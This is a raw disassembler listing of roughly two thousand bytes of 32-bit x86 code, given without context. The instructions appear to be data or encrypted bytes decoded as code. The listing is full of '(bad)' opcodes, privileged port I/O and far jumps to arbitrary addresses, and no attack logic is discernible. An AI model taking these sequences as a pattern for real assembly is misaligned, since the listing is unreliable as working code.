  4126f0:	bound  esi,QWORD PTR [edx+esi*4+0x66]
  4126f4:	xchg   BYTE PTR [ebx],dl
  4126f6:	in     al,0xec
  4126f8:	jne    0x412744
  4126fa:	jae    0x41272d
  4126fc:	xchg   esi,eax
  4126fd:	xchg   edi,eax
  4126fe:	outs   dx,BYTE PTR ds:[esi]
  4126ff:	in     eax,dx
  412700:	neg    DWORD PTR [ecx+0x1c9051a3]
  412706:	fwait
  412707:	add    DWORD PTR [eax+ebx*2],eax
  41270a:	stc    
  41270b:	stos   DWORD PTR es:[edi],eax
  41270c:	pop    edx
  41270d:	pop    edx
  41270e:	xchg   DWORD PTR [edx],esp
  412710:	enter  0x9a0a,0xe7
  412714:	xor    DWORD PTR [edi+0x6e0c9cee],ecx
  41271a:	xor    edi,edi
  41271c:	add    al,0x5f
  41271e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41271f:	jae    0x412796
  412721:	pop    ebx
  412722:	inc    ebx
  412723:	fadd   st,st(4)
  412725:	xor    ebp,ebp
  412727:	rcr    BYTE PTR [edx],0xcf
  41272a:	sub    BYTE PTR [ebx-0x4c],ch
  41272d:	push   es
  41272e:	mov    edx,0x8191967c
  412733:	aam    0x61
  412735:	or     al,0x32
  412737:	mov    bl,0x93
  412739:	jae    0x412728
  41273b:	lods   al,BYTE PTR ds:[esi]
  41273c:	push   0xf69a3d14
  412741:	fs cmp al,0x43
  412744:	mov    bl,0x56
  412746:	jmp    0x1a93:0xab325c7e
  41274d:	xchg   BYTE PTR [esi],cl
  41274f:	mov    esp,0xe7b74615
  412754:	pop    ds
  412755:	mov    al,0xf7
  412757:	jbe    0x41274b
  412759:	aas    
  41275a:	mov    eax,ds:0xe168f533
  41275f:	adc    eax,0x6baa2292
  412764:	or     cl,BYTE PTR [edi+0x7b]
  412767:	les    esi,FWORD PTR [eax+0x68ffebe7]
  41276d:	ja     0x4126fc
  41276f:	aam    0xab
  412771:	inc    ebp
  412772:	cmp    BYTE PTR [edx],ch
  412774:	fdivp  st(1),st
  412776:	fs sbb al,0x63
  412779:	shl    DWORD PTR [edx-0x7d],1
  41277c:	lock xchg ebx,eax
  41277e:	mov    esi,0x3b1c4c6d
  412783:	sub    ebp,ebx
  412785:	inc    ebp
  412786:	xchg   ebx,eax
  412787:	xchg   esi,eax
  412788:	push   cs
  412789:	dec    ebx
  41278a:	cmp    eax,0xe354ba80
  41278f:	pop    ss
  412790:	adc    DWORD PTR [ebx],eax
  412792:	push   edx
  412793:	retf   0xd9e1
  412796:	fs cdq 
  412798:	mov    bh,0x94
  41279a:	into   
  41279b:	jae    0x4127e1
  41279d:	xchg   edi,eax
  41279e:	adc    DWORD PTR ds:0x9363205a,edi
  4127a4:	push   esi
  4127a5:	addr16 ret 0xbe33
  4127a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127aa:	or     dh,dh
  4127ac:	fwait
  4127ad:	pushf  
  4127ae:	popf   
  4127af:	mov    ah,0x36
  4127b1:	jge    0x412780
  4127b3:	push   es
  4127b4:	sbb    al,0x3d
  4127b6:	hlt    
  4127b7:	jo     0x4127de
  4127b9:	mov    ?,WORD PTR [esi]
  4127bb:	daa    
  4127bc:	add    bh,BYTE PTR [edi+ebp*1-0x6615c971]
  4127c3:	out    dx,al
  4127c4:	fdiv   QWORD PTR [esi+eax*4+0x59f2b573]
  4127cb:	adc    al,0x16
  4127cd:	(bad)  
  4127ce:	les    esi,FWORD PTR [ebx]
  4127d0:	add    BYTE PTR [eax],0x59
  4127d3:	add    esp,DWORD PTR [esi-0x10]
  4127d6:	call   DWORD PTR [edi]
  4127d8:	pusha  
  4127d9:	hlt    
  4127da:	aaa    
  4127db:	dec    edx
  4127dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127dd:	popa   
  4127de:	mov    dl,BYTE PTR ss:[ebp+0x6b]
  4127e2:	sub    ebx,DWORD PTR [ebx+ecx*8-0x17]
  4127e6:	sub    al,bh
  4127e8:	or     al,0x1
  4127ea:	mov    bh,0x82
  4127ec:	stos   BYTE PTR es:[edi],al
  4127ed:	cmp    DWORD PTR [esi+eiz*1],ebx
  4127f0:	and    ah,ch
  4127f2:	mov    dl,0xb9
  4127f4:	(bad)  [esp+edi*4+0x74f7224e]
  4127fb:	inc    ecx
  4127fc:	mov    cl,0xa2
  4127fe:	or     ebx,eax
  412800:	aam    0xb5
  412802:	jecxz  0x412786
  412804:	call   0xcf9f:0x361ba110
  41280b:	sub    eax,0x7a1c7833
  412810:	clc    
  412811:	add    ebp,edi
  412813:	mov    bh,0x42
  412815:	imul   eax,DWORD PTR [edx],0xeb0334fa
  41281b:	dec    esp
  41281c:	sub    eax,0x52bd8abd
  412821:	mov    gs,WORD PTR [eax+eax*2]
  412824:	mov    ebx,0xaaa5b0b4
  412829:	(bad)  
  41282a:	lods   al,BYTE PTR ds:[esi]
  41282b:	pop    es
  41282c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41282d:	jno    0x412879
  41282f:	mov    esp,DWORD PTR ds:0x65352ecb
  412835:	dec    eax
  412836:	fwait
  412837:	inc    ecx
  412838:	ret    0x94e9
  41283b:	rcr    BYTE PTR [ecx+0x280737bf],1
  412841:	jecxz  0x4128af
  412843:	leave  
  412844:	nop
  412845:	jp     0x41280d
  412847:	sbb    DWORD PTR [ecx-0x519c2774],0x8944dbd2
  412851:	mov    ds:0xd0ede5e9,eax
  412856:	inc    edi
  412857:	inc    edi
  412858:	sbb    eax,0x1f8b827d
  41285d:	and    ah,BYTE PTR [ecx]
  41285f:	add    edi,edx
  412861:	cdq    
  412862:	or     BYTE PTR [ebx+edx*1],0xdd
  412866:	mov    ebx,0x1fdea6a9
  41286b:	cld    
  41286c:	cmc    
  41286d:	lods   al,BYTE PTR ds:[esi]
  41286e:	aaa    
  41286f:	mov    al,ds:0x8e602e6a
  412874:	addr16 fsub st(5),st
  412877:	es repnz mov dl,0x9a
  41287b:	jge    0x4128cb
  41287d:	gs jmp 0x36c5:0x5613f39f
  412885:	pop    ss
  412886:	sbb    esi,edi
  412888:	(bad)  
  412889:	fsub   st(5),st
  41288b:	jb     0x4128bd
  41288d:	jecxz  0x412864
  41288f:	pusha  
  412890:	imul   ecx,DWORD PTR [ecx],0x2b98522e
  412896:	sbb    DWORD PTR [eax-0x7881ffb3],0x4c07d2fb
  4128a0:	outs   dx,BYTE PTR ds:[esi]
  4128a1:	jne    0x412833
  4128a3:	call   0x57a2:0x532aef84
  4128aa:	retf   0xe3
  4128ad:	(bad)  
  4128ae:	mov    edi,0x9ad9db9c
  4128b3:	and    eax,0x24f1e3d5
  4128b8:	jl     0x412914
  4128ba:	int3   
  4128bb:	jecxz  0x41285b
  4128bd:	clc    
  4128be:	jl     0x41289e
  4128c0:	sub    cl,BYTE PTR [ebx]
  4128c2:	(bad)  
  4128c3:	in     eax,0xaf
  4128c5:	hlt    
  4128c6:	jns    0x4128cf
  4128c8:	jle    0x41290c
  4128ca:	sbb    di,di
  4128cd:	mov    cl,0x56
  4128cf:	(bad)  
  4128d0:	mov    ds:0x904fe60b,eax
  4128d5:	xchg   ecx,eax
  4128d6:	or     eax,0xce8c5fbc
  4128db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128dc:	push   ecx
  4128dd:	push   esp
  4128de:	jge    0x4128bf
  4128e0:	xor    cl,ah
  4128e2:	imul   esi,edx,0xf2a8f353
  4128e8:	mov    bl,0xfb
  4128ea:	imul   edi,DWORD PTR [ecx-0x46246e50],0x647d5258
  4128f4:	(bad)  
  4128f6:	mov    ds:0x9c9870a9,al
  4128fb:	lods   eax,DWORD PTR ds:[esi]
  4128fc:	xchg   esp,eax
  4128fd:	or     bl,BYTE PTR [esi+0x1b3a9dfc]
  412903:	xlat   BYTE PTR ds:[ebx]
  412904:	adc    BYTE PTR [ecx+0x41994cc0],dl
  41290a:	inc    esi
  41290b:	adc    DWORD PTR [esi],0xa3b2ed09
  412911:	xchg   ecx,eax
  412912:	and    al,0xde
  412914:	add    BYTE PTR [ebx],0xe1
  412917:	mov    DWORD PTR [ecx-0x49],esi
  41291a:	xor    ecx,DWORD PTR [ebx]
  41291c:	sahf   
  41291d:	aam    0x1
  41291f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412920:	cmp    DWORD PTR [eax-0x75],esi
  412923:	xor    dh,BYTE PTR [ebx-0x3dec954c]
  412929:	fsubr  st,st(1)
  41292b:	ins    DWORD PTR es:[edi],dx
  41292c:	or     ebp,DWORD PTR [ebx+eax*1-0x40]
  412930:	mov    ebx,0xd754fa1
  412935:	test   DWORD PTR [ebx-0x38219991],ebp
  41293b:	xchg   esp,eax
  41293c:	hlt    
  41293d:	xchg   edi,eax
  41293e:	jo     0x4128f4
  412940:	sub    al,0x74
  412942:	xchg   BYTE PTR [edx-0x6b4d2030],bl
  412948:	xchg   BYTE PTR [edx+eiz*2],ch
  41294b:	pop    esi
  41294c:	xchg   esi,eax
  41294d:	into   
  41294e:	mov    al,0xec
  412950:	pop    esi
  412951:	jne    0x4129b4
  412953:	dec    esp
  412954:	jle    0x412975
  412956:	mov    ah,0xb
  412958:	mov    dl,0x3b
  41295a:	add    eax,0x9eb1b107
  41295f:	adc    esp,DWORD PTR [edi-0x38571686]
  412965:	adc    eax,0xad3e9087
  41296a:	mov    eax,ds:0x1f7cb963
  41296f:	ss mov dl,0x96
  412972:	sbb    edi,esp
  412974:	test   al,0x5a
  412976:	push   edi
  412977:	repnz (bad) 
  412979:	jl     0x41290f
  41297b:	gs cwde 
  41297d:	lock shl DWORD PTR ds:[esi],1
  412981:	pusha  
  412982:	sub    al,0x19
  412984:	jnp    0x412928
  412986:	add    BYTE PTR es:[edx+edi*4-0x68],bh
  41298b:	xchg   ecx,eax
  41298c:	push   eax
  41298d:	enter  0xc231,0xde
  412991:	fld    DWORD PTR [esi]
  412993:	adc    eax,0x48c5430e
  412998:	imul   eax,DWORD PTR [ecx-0x4e325f99],0x90407fc0
  4129a2:	push   edx
  4129a3:	fisttp DWORD PTR [eax-0x4b7dfd23]
  4129a9:	ficomp DWORD PTR [ebp+0x595aa289]
  4129af:	fimul  WORD PTR [esi+eiz*2]
  4129b2:	clc    
  4129b3:	or     eax,0x733f5df9
  4129b8:	ss dec eax
  4129ba:	repz shl BYTE PTR [ebx+0x226e27ec],1
  4129c1:	jg     0x412962
  4129c3:	fidiv  DWORD PTR [esi+ebx*4]
  4129c6:	mov    edx,0x5ce273c4
  4129cb:	or     ecx,DWORD PTR [ebx]
  4129cd:	pop    cx
  4129cf:	int3   
  4129d0:	leave  
  4129d1:	lods   al,BYTE PTR ds:[esi]
  4129d2:	lea    edx,[edi]
  4129d4:	shl    dl,1
  4129d6:	sub    eax,0xa686891e
  4129db:	pop    eax
  4129dc:	cmp    al,0x85
  4129de:	icebp  
  4129df:	es mov al,0x83
  4129e2:	jl     0x412a25
  4129e4:	jmp    0x412a46
  4129e6:	ret    0x1e09
  4129e9:	into   
  4129ea:	push   edx
  4129eb:	mov    esp,0x6519770b
  4129f0:	aas    
  4129f1:	cs in  al,dx
  4129f3:	cmp    BYTE PTR [eax+0x54],bh
  4129f6:	and    BYTE PTR [edi],cl
  4129f8:	cmp    ecx,esp
  4129fa:	and    DWORD PTR [esi+ebx*8],0x66
  4129fe:	(bad)  
  4129ff:	retf   0x8ccd
  412a02:	mov    ds:0xbdb9197,al
  412a07:	sub    bl,0x20
  412a0a:	enter  0x2c39,0xa
  412a0e:	addr16 pop ecx
  412a10:	fnstcw WORD PTR [esi-0xd]
  412a13:	push   edx
  412a14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a15:	pop    esp
  412a16:	rcl    BYTE PTR ds:0x878ec1e1,0x8e
  412a1d:	outs   dx,DWORD PTR ds:[esi]
  412a1e:	and    al,0xd8
  412a20:	dec    esi
  412a21:	lahf   
  412a22:	cmp    ch,BYTE PTR [esi]
  412a24:	add    ebp,DWORD PTR [ecx+0x43]
  412a27:	shl    BYTE PTR [ecx+0x28b91dfb],cl
  412a2d:	mov    al,0xb1
  412a2f:	imul   esp,DWORD PTR [edx-0x4d],0xaf871f35
  412a36:	loope  0x4129c5
  412a38:	mov    cl,BYTE PTR ds:0xe8136587
  412a3e:	popa   
  412a3f:	outs   dx,BYTE PTR ds:[esi]
  412a40:	lods   al,BYTE PTR ds:[esi]
  412a41:	dec    edx
  412a42:	xlat   BYTE PTR ds:[ebx]
  412a43:	sub    DWORD PTR [esp+edx*1],0xffffffca
  412a47:	push   ss
  412a48:	sar    DWORD PTR fs:[ebp+0x3e],0x5b
  412a4d:	cwde   
  412a4e:	xlat   BYTE PTR ds:[ebx]
  412a4f:	js     0x4129e8
  412a51:	ret    0xc30e
  412a54:	dec    ecx
  412a55:	neg    dh
  412a57:	je     0x412ad0
  412a59:	add    eax,0x26376492
  412a5e:	ins    BYTE PTR es:[edi],dx
  412a5f:	mov    ah,0x6b
  412a61:	jb     0x412a07
  412a63:	stc    
  412a64:	mov    ah,0xf3
  412a66:	adc    al,0x24
  412a68:	pop    ebx
  412a69:	dec    bx
  412a6b:	push   0xa4f535a0
  412a70:	push   esi
  412a71:	jmp    0xed50e478
  412a76:	mov    al,ds:0x818f74f8
  412a7b:	lds    ebp,FWORD PTR [esi+eax*4-0x188c8327]
  412a82:	jnp    0x412ae3
  412a84:	in     al,dx
  412a85:	je     0x412ab5
  412a87:	pushf  
  412a88:	adc    al,0x9b
  412a8a:	and    DWORD PTR [edx+0x6f],esp
  412a8d:	adc    DWORD PTR [edx],0xfffffff1
  412a90:	daa    
  412a91:	jmp    0xfd5ac0f4
  412a96:	mov    al,0x7
  412a98:	xor    BYTE PTR [esi],dh
  412a9a:	popf   
  412a9b:	push   edx
  412a9c:	repz popf 
  412a9e:	mov    ch,0xc8
  412aa0:	mov    bl,BYTE PTR [eax+0x20f6bd1c]
  412aa6:	into   
  412aa7:	pusha  
  412aa8:	xchg   ebp,eax
  412aa9:	mov    dh,0x2d
  412aab:	les    ecx,FWORD PTR [ebp+0x30]
  412aae:	ror    DWORD PTR [ebp-0x7f6b8de5],0x96
  412ab5:	dec    ebp
  412ab6:	sbb    eax,0xe2946d7
  412abb:	xchg   DWORD PTR [ecx-0x50],edx
  412abe:	fdivrp st(6),st
  412ac0:	cli    
  412ac1:	push   0x53ca5fa1
  412ac6:	dec    ebp
  412ac7:	(bad)  
  412ac8:	fmul   QWORD PTR [eax]
  412aca:	dec    esi
  412acb:	mov    ebp,0xa10f4cf
  412ad0:	dec    ebx
  412ad1:	ds ret 
  412ad3:	hlt    
  412ad4:	mov    ebp,0xf40ca1f2
  412ad9:	je     0x412b2a
  412adb:	xor    ch,BYTE PTR [edi-0x78bf7549]
  412ae1:	lods   al,BYTE PTR ds:[esi]
  412ae2:	add    BYTE PTR [edx],ch
  412ae4:	nop
  412ae5:	mov    bl,0x2c
  412ae7:	js     0x412b17
  412ae9:	shl    BYTE PTR [ebx-0x42474fcc],cl
  412aef:	mov    ebx,0x506a33c4
  412af4:	inc    edx
  412af5:	dec    edi
  412af6:	lods   al,BYTE PTR ds:[esi]
  412af7:	inc    edi
  412af8:	xchg   edx,eax
  412af9:	shr    BYTE PTR [ecx+0x26],1
  412afc:	dec    ecx
  412afd:	fidivr WORD PTR [ecx-0x2b780da9]
  412b03:	mov    ebp,0xe4d97585
  412b08:	jae    0x412b3a
  412b0a:	push   eax
  412b0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b0c:	out    dx,al
  412b0d:	out    dx,al
  412b0e:	mov    dl,BYTE PTR [ecx+0x2e]
  412b11:	inc    ecx
  412b12:	movlps QWORD PTR [eax+0x4651da64],xmm1
  412b19:	push   ebx
  412b1a:	dec    esp
  412b1b:	add    cl,BYTE PTR [edi]
  412b1d:	adc    DWORD PTR [edi-0x72e00175],ebp
  412b23:	dec    esp
  412b24:	push   ss
  412b25:	jno    0x412b05
  412b27:	push   ss
  412b28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b29:	loop   0x412b75
  412b2b:	mov    ecx,0x88628602
  412b30:	cmp    al,0x5a
  412b32:	pop    es
  412b33:	aas    
  412b34:	mov    ebx,0x58c1e64e
  412b39:	push   eax
  412b3a:	dec    edi
  412b3b:	sbb    bh,ah
  412b3d:	retf   
  412b3e:	add    eax,0x305469a3
  412b43:	mov    edi,0x3e083b74
  412b48:	xor    BYTE PTR [esi-0x4f2b1076],0xba
  412b4f:	dec    ebp
  412b50:	sbb    ah,BYTE PTR [ecx+0x3e]
  412b53:	pop    esp
  412b54:	es jg  0x412af0
  412b57:	mov    al,0x1
  412b59:	lods   eax,DWORD PTR ds:[esi]
  412b5a:	jge    0x412b17
  412b5c:	mov    bh,cl
  412b5e:	mov    cl,0xdc
  412b60:	or     dh,bl
  412b62:	mov    ah,0xd8
  412b64:	rol    DWORD PTR [eax+0x657e7405],cl
  412b6a:	sub    eax,0x976d8f42
  412b6f:	test   al,0x96
  412b71:	lods   al,BYTE PTR ds:[esi]
  412b72:	mov    eax,ds:0x1d0efbb2
  412b77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b78:	push   edx
  412b79:	ret    
  412b7a:	xchg   DWORD PTR [edi-0x41d5075],esp
  412b80:	jbe    0x412bf1
  412b82:	mov    ebx,0xd20d08af
  412b87:	call   0x5d01:0x253159b5
  412b8e:	int    0x0
  412b90:	fld    QWORD PTR [ebp+0x1d41b271]
  412b96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b97:	pop    ecx
  412b98:	xor    al,0x52
  412b9a:	je     0x412bba
  412b9c:	in     al,0x32
  412b9e:	xor    ecx,edx
  412ba0:	or     ebp,DWORD PTR [ebx+ebp*1]
  412ba3:	pop    edi
  412ba4:	push   esp
  412ba5:	ss inc si
  412ba8:	ret    
  412ba9:	xor    eax,0xf28be84e
  412bae:	inc    edi
  412baf:	or     BYTE PTR [edx-0x34],al
  412bb2:	add    eax,0x5592d2
  412bb7:	jb     0x412ba2
  412bb9:	addr16 jle 0x412bea
  412bbc:	pushf  
  412bbd:	sub    cl,BYTE PTR [esi-0x29]
  412bc0:	mov    ds:0x4bc13ad6,eax
  412bc5:	repz fsub QWORD PTR [eax+0x5dce7a7b]
  412bcc:	or     BYTE PTR [ebp-0x462194b7],bl
  412bd2:	adc    bh,bl
  412bd4:	cmp    eax,0xfe38a0f4
  412bd9:	sti    
  412bda:	retf   
  412bdb:	cld    
  412bdc:	cmp    eax,0x6495cce7
  412be1:	xor    ebx,DWORD PTR ss:[eax+0x58c19002]
  412be8:	enter  0xe0b5,0xa5
  412bec:	jnp    0x412be2
  412bee:	stc    
  412bef:	add    DWORD PTR [ebp-0x21],edx
  412bf2:	test   eax,0x10cfd163
  412bf7:	add    eax,0xd3e747da
  412bfc:	loop   0x412c41
  412bfe:	call   FWORD PTR [esi+edx*1+0x1c37f2c9]
  412c05:	ds push ds
  412c07:	clc    
  412c08:	outs   dx,DWORD PTR ds:[esi]
  412c09:	rcr    DWORD PTR [ebx],0x95
  412c0c:	adc    eax,0x7299affb
  412c11:	test   DWORD PTR [ebp-0x41],0xe1c1f60b
  412c18:	xor    ecx,edi
  412c1a:	and    al,0x57
  412c1c:	into   
  412c1d:	mov    cl,0xb2
  412c1f:	add    DWORD PTR [edx+0x74],edx
  412c22:	icebp  
  412c23:	cmp    al,0xf4
  412c25:	inc    ebp
  412c26:	dec    edx
  412c27:	sub    esp,DWORD PTR [ebx-0x55]
  412c2a:	mov    ebp,0xb9b1d580
  412c2f:	and    eax,0x7610e4fa
  412c34:	in     eax,dx
  412c35:	xchg   esp,eax
  412c36:	adc    bl,ah
  412c38:	not    DWORD PTR [edi]
  412c3a:	push   ebp
  412c3b:	ja     0x412c7e
  412c3d:	mov    edi,0xbddbbaaa
  412c42:	pusha  
  412c43:	rol    ch,cl
  412c45:	das    
  412c46:	xor    eax,0x6172018e
  412c4b:	clc    
  412c4c:	xor    eax,edi
  412c4e:	jg     0x412be3
  412c50:	mov    es,WORD PTR [eax+0x3d]
  412c53:	or     DWORD PTR [ebp+eax*1+0x1ef07c6d],0xffffffe1
  412c5b:	ds jge 0x412c50
  412c5e:	jge    0x412bea
  412c60:	pop    ebx
  412c61:	ds enter 0xc2ea,0x44
  412c66:	xchg   ebx,eax
  412c67:	(bad)  
  412c68:	pop    esi
  412c69:	sbb    eax,0x784dbf74
  412c6e:	jne    0x412c61
  412c70:	xor    ch,BYTE PTR [edi]
  412c72:	test   DWORD PTR [ebx],edx
  412c74:	(bad)  
  412c75:	scas   eax,DWORD PTR es:[edi]
  412c76:	mov    WORD PTR [eax],?
  412c78:	ror    DWORD PTR [ecx],cl
  412c7a:	or     eax,0xce8b29c0
  412c7f:	pushf  
  412c80:	iret   
  412c81:	(bad)  
  412c82:	lds    edx,FWORD PTR [esi]
  412c84:	push   es
  412c85:	out    dx,eax
  412c86:	call   0x5fc639c5
  412c8b:	mov    ecx,fs
  412c8d:	xor    DWORD PTR ds:0x83d6c287,esi
  412c93:	repz mov ebx,0x59056512
  412c99:	fsub   DWORD PTR [ebx]
  412c9b:	imul   DWORD PTR [edi-0x2b]
  412c9e:	cmc    
  412c9f:	inc    esp
  412ca0:	inc    edi
  412ca1:	mov    al,0x96
  412ca3:	in     eax,dx
  412ca4:	rol    BYTE PTR [esi+0xa676be8],1
  412caa:	inc    ebp
  412cab:	lds    ebp,FWORD PTR [ebx]
  412cad:	ins    DWORD PTR es:[edi],dx
  412cae:	or     BYTE PTR [ebx+0x1f5f2b7b],al
  412cb4:	mov    ecx,0x3931cf6b
  412cb9:	and    ch,BYTE PTR [ebp-0x32748223]
  412cbf:	jg     0x412d1f
  412cc1:	xchg   ebp,eax
  412cc2:	jne    0x412ceb
  412cc4:	das    
  412cc5:	mov    eax,ds:0xe3c27d09
  412cca:	add    eax,0x270cfb1b
  412ccf:	daa    
  412cd0:	ins    BYTE PTR es:[edi],dx
  412cd1:	adc    BYTE PTR [esi],bh
  412cd3:	or     ebp,esp
  412cd5:	leave  
  412cd6:	jg     0x412d22
  412cd8:	mov    eax,ds:0x65719af5
  412cdd:	fucomp st(4)
  412cdf:	jg     0x412d11
  412ce1:	std    
  412ce2:	adc    cl,cl
  412ce4:	pushf  
  412ce5:	or     BYTE PTR [eax],al
  412ce7:	jmp    0x116a:0x177ed3c6
  412cee:	ins    DWORD PTR es:[edi],dx
  412cef:	aam    0xbd
  412cf1:	pushf  
  412cf2:	aam    0xf
  412cf4:	mov    ds:0x1dcd72a6,al
  412cf9:	adc    ebx,esi
  412cfb:	push   esp
  412cfc:	adc    dl,bl
  412cfe:	fidivr WORD PTR ds:0x74f421c1
  412d04:	cmc    
  412d05:	(bad)  
  412d06:	test   al,0x40
  412d08:	push   ss
  412d09:	xchg   BYTE PTR [edi+0x7c],dh
  412d0c:	push   ebp
  412d0d:	ret    
  412d0e:	adc    eax,0x7e2eacfe
  412d13:	fistp  QWORD PTR [esi]
  412d15:	mov    al,ds:0x94678a89
  412d1a:	adc    BYTE PTR [esi+esi*8-0x43],cl
  412d1e:	test   DWORD PTR [eax+0x9],esp
  412d21:	jb     0x412d80
  412d23:	mov    ch,0x97
  412d25:	dec    ecx
  412d26:	test   DWORD PTR [esi+eax*2-0x4c],ebp
  412d2a:	loopne 0x412cc8
  412d2c:	das    
  412d2d:	mov    sp,WORD PTR [ebx-0x453f7d71]
  412d34:	push   ebx
  412d35:	inc    ebx
  412d36:	mov    ch,BYTE PTR [eax+0x6a]
  412d39:	pop    ss
  412d3a:	mov    bl,0x3f
  412d3c:	js     0x412ced
  412d3e:	jne    0x412cd4
  412d40:	pop    esp
  412d41:	or     BYTE PTR [ebp+0x4391adb6],bh
  412d47:	dec    esp
  412d48:	stc    
  412d49:	out    dx,eax
  412d4a:	and    eax,0x5a85d6ad
  412d4f:	xor    DWORD PTR [esp+ecx*2+0x49888637],0x31183969
  412d5a:	adc    ah,BYTE PTR [edx+0x2b20a22f]
  412d60:	cs and esp,esi
  412d63:	cmp    BYTE PTR [esi],cl
  412d65:	dec    esp
  412d66:	mov    esp,0x739ba089
  412d6b:	mov    eax,0xa4ecf338
  412d70:	arpl   WORD PTR [ebx],si
  412d72:	jae    0x412d10
  412d74:	push   edx
  412d75:	(bad)
  412d79:	dec    ebx
  412d7a:	jle    0x412dcd
  412d7c:	fwait
  412d7d:	xor    al,0xd0
  412d7f:	ret    
  412d80:	daa    
  412d81:	add    eax,0x6816e38e
  412d86:	or     DWORD PTR [eax+0x53],esi
  412d89:	not    BYTE PTR [esi-0x5f]
  412d8c:	mov    ch,0x1b
  412d8e:	int3   
  412d8f:	sub    DWORD PTR [ecx-0x52],0x3038dedf
  412d96:	retf   
  412d97:	dec    edi
  412d98:	sbb    ebp,DWORD PTR [ebx+0x7]
  412d9b:	xchg   ecx,eax
  412d9c:	sbb    edi,DWORD PTR [ecx+eax*1]
  412d9f:	xchg   ecx,eax
  412da0:	mov    al,ds:0x1eedc9bc
  412da5:	shr    ecx,1
  412da7:	pop    ebp
  412da8:	and    al,0x6a
  412daa:	cdq    
  412dab:	repnz xor ch,dh
  412dae:	lahf   
  412daf:	mov    ebx,ss
  412db1:	stc    
  412db2:	or     BYTE PTR [ebx-0x216609ab],dh
  412db8:	pop    ecx
  412db9:	mov    bl,dh
  412dbb:	(bad)  
  412dbc:	mov    eax,ds:0x1659374d
  412dc1:	or     cl,bl
  412dc3:	xor    DWORD PTR [esi+0x15],edi
  412dc6:	mov    edx,0xb5f459fb
  412dcb:	iret   
  412dcc:	std    
  412dcd:	push   esp
  412dce:	in     al,dx
  412dcf:	leave  
  412dd0:	inc    ecx
  412dd1:	or     cl,BYTE PTR [eax-0x72f3d412]
  412dd7:	cmp    bh,al
  412dd9:	mov    dl,0x10
  412ddb:	add    cl,BYTE PTR [edx-0x70]
  412dde:	push   eax
  412ddf:	push   cs
  412de0:	mov    dh,0x18
  412de2:	add    ebx,DWORD PTR [edi*1-0x135d7027]
  412de9:	test   eax,0xee35a246
  412dee:	sub    ebp,DWORD PTR [esp+edi*1+0x7e413df8]
  412df5:	ins    DWORD PTR es:[edi],dx
  412df6:	push   0x652cd231
  412dfb:	bound  ecx,QWORD PTR [edx+0x2c891d9f]
  412e01:	rol    edi,cl
  412e03:	pop    ss
  412e04:	bound  ebp,QWORD PTR [esi+0x4f]
  412e07:	push   ebp
  412e08:	cmp    eax,0x96e7dc69
  412e0d:	std    
  412e0e:	retf   
  412e0f:	sbb    ecx,edi
  412e11:	pop    esp
  412e12:	retf   0x13cc
  412e15:	daa    
  412e16:	cdq    
  412e17:	pop    es
  412e18:	aam    0xd7
  412e1a:	xor    esp,0x5f3adf05
  412e20:	std    
  412e21:	lea    edi,[ecx-0x4c74ad46]
  412e27:	lea    ebx,[esi-0x78]
  412e2a:	and    ah,BYTE PTR ds:0x78acd57c
  412e30:	jne    0x412e89
  412e32:	in     al,dx
  412e33:	div    DWORD PTR [esi-0x48]
  412e36:	clc    
  412e37:	gs inc ecx
  412e39:	jbe    0x412e06
  412e3b:	and    eax,0x69bbce04
  412e40:	mov    edi,DWORD PTR [eax-0x24]
  412e43:	das    
  412e44:	mov    ebp,0x28925244
  412e49:	jae    0x412e74
  412e4b:	jns    0x412e86
  412e4d:	outs   dx,DWORD PTR ds:[esi]
  412e4e:	adc    al,0xe0
  412e50:	mov    ds:0x73b0cdc0,al
  412e55:	adc    ah,BYTE PTR [ebx-0x19]
  412e58:	adc    eax,0x6c314aae
  412e5d:	popf   
  412e5e:	jo     0x412e15
  412e60:	mov    eax,ds:0x727c94c6
  412e65:	pop    es
  412e66:	sub    al,0x4b
  412e68:	xchg   esi,eax
  412e69:	dec    esp
  412e6a:	mov    ebx,0x479a5128
  412e6f:	out    dx,al
  412e70:	mov    edx,0x345a1454
  412e75:	pop    eax
  412e76:	popf   
  412e77:	lods   eax,DWORD PTR ds:[esi]
  412e78:	arpl   WORD PTR [edi+0x3c5df51f],si
  412e7e:	jg     0x412edc
  412e80:	enter  0x747f,0x91
  412e84:	cs jno 0x412e3e
  412e87:	adc    eax,0x618b6013
  412e8c:	ins    BYTE PTR es:[edi],dx
  412e8d:	mov    edx,0xcd629474
  412e92:	ds mov ch,0x5a
  412e95:	cmp    BYTE PTR [edi+0x5a],0x1b
  412e99:	push   0x26e3fb92
  412e9e:	adc    BYTE PTR [esi],ch
  412ea0:	(bad)  
  412ea1:	push   ds
  412ea2:	cld    
  412ea3:	bnd jbe 0x412ea4
  412ea6:	jmp    FWORD PTR [ecx+0xf]
  412ea9:	dec    eax
  412eaa:	(bad)  
  412eab:	push   ecx
  412eac:	pop    es
  412ead:	jno    0x412ee0
  412eaf:	dec    eax
  412eb0:	outs   dx,DWORD PTR ds:[esi]
  412eb1:	dec    ebx
  412eb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eb3:	mov    edi,0xa0b4437f
  412eb8:	div    DWORD PTR [ebx+edx*4-0x32]
  412ebc:	aas    
  412ebd:	xchg   edx,eax
  412ebe:	cmc    
  412ebf:	repz imul ebp,DWORD PTR [ecx+0x34136a60],0x54
  412ec7:	out    0x6b,eax
  412ec9:	pop    esp
  412eca:	xor    ah,BYTE PTR [esi-0x2b0afa80]
  412ed0:	pop    ebp
  412ed1:	call   DWORD PTR [esi+eiz*4+0x9075736]
  412ed8:	cld    
  412ed9:	mov    edx,DWORD PTR [edx]
  412edb:	aas    
  412edc:	add    al,0x24
  412ede:	jmp    0x841866a5
  412ee3:	idiv   DWORD PTR [ebx+0x2a52a302]
  412ee9:	xchg   esp,eax
  412eea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
